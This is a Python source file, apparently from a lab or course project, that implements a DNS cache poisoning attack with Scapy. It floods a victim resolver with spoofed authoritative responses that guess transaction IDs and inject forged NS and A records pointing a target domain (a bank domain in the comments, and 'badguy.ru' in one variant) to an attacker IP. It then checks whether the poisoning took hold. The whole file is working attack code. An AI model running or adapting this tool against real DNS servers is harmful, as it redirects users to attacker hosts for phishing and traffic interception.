#! /usr/bin/env python3

## @package DNS_Poisoning
#
#   This package includes all methos to execute the poisoning attack.


from scapy import *
from scapy.all import *
import scapy.layers.l2
import time
from multiprocessing.pool import ThreadPool
import logging
import threading
import multiprocessing
import signal

## DNSPoisoning
#
#   This class is responsible for the dns poisoning attack. Two mode are available:
#   - Normal Flood (Use IP packets)
#   - Faster Flood (Use Ethernet packets)
#   
#
class DNSPoisoning:

    ##  Constructor
    #
    #   @param victim_server    The IP of the server to attack
    #   @param attacker_ip      The IP of the attacker
    #   @param spoofed_domain   The domain that the tool tries to spoof
    #   @param authoritative_ns The authoritative nameserver for the target domain
    #   @param initial_id       The ID to use for guessing the response TXID. If not specified random ID is used
    #   @param ttl              The TTL value to put into the relative DNS field. (Default 30000)
    #   @param victim_mac       The victim server MAC address (Only needed for "faster flood" mode).
    #   @param nic_interface    The Network Card Interface to use (Reccomended on "faster flood" mode)
    #   @param interrupt_handler    The function that handle the CTRL+C signal    
    #   @param blessing_terminal    The instance of the blessing terminal (optional)
    #   @param log              The function used to print messages
    #
    #
    def __init__(self, victim_server, spoofed_domain, attacker_ip, authoritative_ns,\
         initial_id=None, ttl=30000, victim_mac=None, nic_interface=None, \
             interrupt_handler=None, blessing_terminal=None, log=lambda msg: None):
        
        ## Victim Server IP
        self.victim_server = victim_server  
        ## Target domain to spoof    
        self.spoofed_domain = spoofed_domain
        ## IP of the Attacker
        self.attacker_ip = attacker_ip
        ## Source Port of the target DNS
        self.sport = 53
        ## TTL Value to be used in the response
        self.ttl = ttl
        ## Network Interface card to use
        self.nic_interface = nic_interface
        ## Authoritative nameserver
        self.auth_nameserver = authoritative_ns
        
        self.flood_pool = None
        self.flood_socket = None


        if initial_id is not None:
            self.id = initial_id
        else:
            self.id = random.randint(0,65535)   #Use a random ID

        ## Invalid URL used in the attack
        self.invalid_url = 'x' + str(random.randint(10,1000)) + 'x.' + self.spoofed_domain + '.'


        self.victim_mac = victim_mac

        log("Invalid URL used: {t.bold}" + self.invalid_url + "{t.normal}")

        #Optional Parameters

        ## Logging Function
        self.log = log        
        ## Blessing terminal instance                             
        self.t = blessing_terminal    
        ## Handler of CTRL+C                     
        self.interrupt_handler = interrupt_handler         



    ##  Set Interface
    #   @brief Set the network interface
    #   @param interface The network interface to use
    def set_interface(self, interface):
        self.nic_interface = interface

    def set_victim_mac(self, victim_mac):
        self.victim_mac = victim_mac

    ##  Open Socket
    #   @brief Open a socket for flooding
    #
    #   Open a socket for flooding packets instead of creating a new one for each request.
    #

    def open_socket(self):
        if self.flood_socket != None:
            self.flood_socket.close()
        self.log("Opening socket...")
        self.flood_socket = conf.L3socket(iface=self.nic_interface) 

    ## Faster Flooding Mode
    #   @brief Send Crafted Packet via Ethernet packets 
    #   @param  victim_mac  The victim DNS server MAC address. If none is specified the one setted in the contructor will be used.
    #   @param  nic_interface   The network interface to use. If none is specified the one setted in the contructor will be used.
    #  
    #  This funciton floods the request using layer two packet, which is generally faster than using a normal IP. 
    #  
    #
    def faster_flooding(self, victim_mac=None, nic_interface=None):

        if victim_mac is None:
            victim_mac = self.victim_mac
        if nic_interface is None:
            nic_interface = self.nic_interface

        #Check even if the initialized MAC (in the constructor) is none
        if victim_mac is None:
            log("Cannot perform 'faster flooding' mode without target MAC")
            return

        pkts = []

        ## Number of queries and responses to send
        number_of_response = 500
        ## Spacing value to be added to the initial ID value
        spacing = 600


        print("Sending {t.bold}{t.blue}{n_query}{t.normal} queries".format(t=self.t, n_query=number_of_response))
        print("Range from {t.bold}{t.blue}{int_id} to {fin_id}{t.normal}".format(int_id= self.id+spacing, fin_id= (self.id+1000+spacing) % 65535-1, t=self.t))
        
        #query = Ether(dst=victim_mac)/IP(dst=self.victim_server)/UDP(dport=53, sport=self.sport)/DNS(id=random.randint(10,1000), rd=1,qd=DNSQR(qname=self.invalid_url))

        for ID in range (self.id +spacing,(self.id + number_of_response + spacing) % 65535-1):

            query = Ether(dst=victim_mac)/IP(dst=self.victim_server)/UDP(dport=53, sport=self.sport)/DNS(id=random.randint(10,1000), rd=1,qd=DNSQR(qname=self.invalid_url))
            pkts.append(query)

            crafted_response = Ether(dst=self.victim_mac)/IP(dst=self.victim_server, src=self.auth_nameserver)\
                /UDP(dport=53, sport=53)\
                    /DNS(id=ID,\
                        qr=1,\
                        #rd=1,\
                        ra=1,\
                        aa=1,\
                        qd=DNSQR(qname=self.invalid_url, qtype="A", qclass='IN'),\
                        ar=DNSRR(rrname='ns.' + self.spoofed_domain, type='A', rclass='IN', ttl=self.ttl, rdata=self.attacker_ip)/DNSRR(rrname=self.spoofed_domain, type='A', rclass='IN', ttl=self.ttl, rdata=self.attacker_ip),\
                        ns=DNSRR(rrname=self.spoofed_domain, type='NS', rclass='IN', ttl=self.ttl, rdata='ns.' + self.spoofed_domain)\
                    )

            pkts.append(crafted_response)


        print("Initial Query sended, start flooding")


        sendp(pkts, verbose=1, iface=nic_interface)


    ##  Send crafted packet
    #
    #   @brief This function bla bla bla bla aaaaaa
    #   @param id_req The TXID to be used
    #
    #   A valid DNS response should respect the following params:
    #   - Response should come from the same dest port (53)
    #   - Question should match the query section
    #   - Query ID should match
    #
    # Use Default DNS port as default source port    
    #
    # DNS Crafter response:  
    #   - ID
    #   - Authoritative
    #   - Question
    #       * Invalid Domain
    #   - Source Port 
    #   - Authoritative Reponse
    #       * ns.bankofallan.co.uk
    #   - Additional RR
    #       - ns.bankofallan.co.uk -> attacker_ip
    #       - bankofallan.co.uk -> attacker_ip
    #
    #    @todo: Check if recursion available
    #

    def send_crafted_packet(self, id_req):
            
        #Scapy field explaination
        #qr = Response Flag
        #rd = Recursion Desidered
        #ra = 
        #aa = Authoritative response
        #nscount = number of NS 
        #arcount = number of authoritative response
        #qdcount = number of question
        #ancount = number of answer

        ID = id_req % 65535


        crafted_response_1 = Ether(dst=self.victim_mac)/IP(dst=self.victim_server, src=self.auth_nameserver)\
            /UDP(dport=53, sport=53)\
                /DNS(id=ID,\
                    qr=1,\
                    #rd=1,\
                    ra=1,\
                    aa=1,\
                    #nscount=1,\
                    #arcount=1,\
                    #ancount=1,\
                    #qdcount=1,\
                    qd=DNSQR(qname=self.invalid_url, qtype="A", qclass='IN'),\
                    #an=DNSRR(rrname=self.invalid_url, type='A', rclass='IN', ttl=70000, rdata=self.attacker_ip),\
                    ar=DNSRR(rrname='ns.' + self.spoofed_domain, type='A', rclass='IN', ttl=70000, rdata=self.attacker_ip),\
                    ns=DNSRR(rrname=self.spoofed_domain, type='NS', rclass='IN', ttl=70000, rdata='ns.' + self.spoofed_domain + '.')\
                )

        #Second type of attack
        crafted_response_2 = IP(dst=self.victim_server, src=self.auth_nameserver)\
            /UDP(dport=53, sport=53)\
                /DNS(id=id_req,\
                    qr=1,\
                    aa=1,\
                    ra=0,\
                    rd=0,\
                    nscount=1,\
                    arcount=1,\
                    ancount=0,\
                    qdcount=1,\
                    qd=DNSQR(qname=self.invalid_url, qtype="A"),\
                    an=None,\
                    ns=DNSRR(rrname=self.invalid_url ,type='NS', rclass=1, ttl=70000, rdata="ns.badguy.ru"),\
                    ar=(DNSRR(rrname='ns.badguy.ru', type='A', rclass='IN', ttl=70000, rdata=self.attacker_ip))
                )

        self.flood_socket.send(crafted_response_1)

    def send_inital_query(self):
        #self.sport = random.randint(1024, 65536)

        self.log("Sending invalid URL query.. ")

        query = IP(dst=self.victim_server)/UDP(dport=53, sport=self.sport)/DNS(rd=1,qd=DNSQR(qname=self.invalid_url))

        self.flood_socket.send(query)

    ## Start Flooding
    #
    #   @brief Start normal flooding attack
    #
    #   @param number_of_guess  Number of response to send (Default 500)
    #   @param spacing          The value to be added to the initial TXID
    #
    #   Start the normal flooding attack which uses IP layer packets
    #   @todo: Check that maximum int value do not surpass 65535 (max 16 bit value)
    #
    def start_flooding(self, number_of_guess=500, spacing=800):

        id_range = range(self.id + spacing,self.id + spacing + number_of_guess)

        self.log("\nUsing ID from {t.bold}{t.blue}{initial}{t.normal} to {t.bold}{t.blue}{final}{t.normal}\n".format(initial=self.id + spacing, final=self.id + spacing + number_of_guess, t=self.t))

        #Taken from that: https://byt3bl33d3r.github.io/mad-max-scapy-improving-scapys-packet-sending-performance.html 
        self.log("Same socket for faster flood...")
        self.open_socket()
        self.flood_pool = ThreadPool(number_of_guess)

        result = self.flood_pool.map(self.send_crafted_packet, id_range)
        self.flood_pool.close()

        self.flood_pool.join()
        self.flood_socket.close()
        self.log("Flood finished")


    ## Check Poisoning
    #   @brief Check if the attack succeded
    # 
    #   Ask the victim for the IP of the domain we are trying to spoof
    #
    def check_poisoning(self):

        try:
            pkt = sr1(IP(dst=self.victim_server) / UDP(sport=53, dport=53) / DNS(qr=0, qd=DNSQR(qname=self.spoofed_domain, qtype='A')), verbose=True, timeout=10)
            self.log("Answer arrived")
            if pkt == None:
                return False

            if pkt[DNS].an and pkt[DNS].an.rdata:
                actualAnswer = str(pkt[DNS].an.rdata)
                # if the IP is our IP, we poisoned the victim
                if actualAnswer == self.attacker_ip:
                    return True
            return False
        except Exception as e:
            print("ERROR - " + str(e))
            return False


    ##  Stop Handler
    #   @brief Function called when CTRL+C is pressed
    #
    def stop_handler(self, sig, frame):
        self.log("Closing socket")
        self.flood_socket.close()
        #self.flood_pool.terminate()
        self.log("Cache poisoning stopped")

        if self.interrupt_handler  != None:     #If an interrupt handler is passed
            signal.signal(signal.SIGINT, self.interrupt_handler)    #Set it as a new SIGINT handler
